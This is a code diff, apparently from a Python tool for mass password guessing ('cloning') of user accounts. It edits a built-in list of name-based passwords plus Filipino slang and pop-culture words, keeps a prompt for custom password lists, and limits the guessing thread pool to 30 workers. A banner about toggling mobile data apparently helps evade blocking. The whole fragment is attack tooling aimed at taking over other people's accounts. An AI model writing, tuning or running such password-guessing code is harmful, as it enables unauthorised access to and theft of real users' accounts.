@@ -150,33 +150,12 @@ def ク克隆():
     )
     H = input(f"{green}  [›] CHOICE:{dark_gray} ")
     if H in ["1", "01"]:
-        A.append("first last")
-        A.append("first123")
-        A.append("first12")
+        A.append("firstlast")
+        A.append("lastfirst")
+        A.append("firstlast123")
         A.append("first143")
-        A.append("first12345")
-        A.append("first123456")
-        A.append("first_123")
-        A.append("maganda")
-        A.append("magandaako")
-        A.append("gandako")
-        A.append("ganda")
-        A.append("cuteako")
-        A.append("god143")
-        A.append("i love you")
-        A.append("firstpretty")
-        A.append("firstpogi")
-        A.append("firstigop")
-        A.append("firstdump")
-        A.append("potanginamo")
-        A.append("lastlast")
-        A.append("firstfirst")
-        A.append("firstganda")
-        A.append("firstmaganda")
-        A.append("blackpink")
-        A.append("jungkook")
-        A.append("pogiko")
-        A.append("pogiako")
+        A.append("first123")
+        A.append("last123")
     else:
         try:
             prnt(
@@ -199,7 +178,7 @@ def ク克隆():
         )
         for I in range(C):
             A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
-    with ThreadPool(max_workers=None) as J:
+    with ThreadPool(max_workers=30) as J:
         prnt(
             pnl(
                 "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
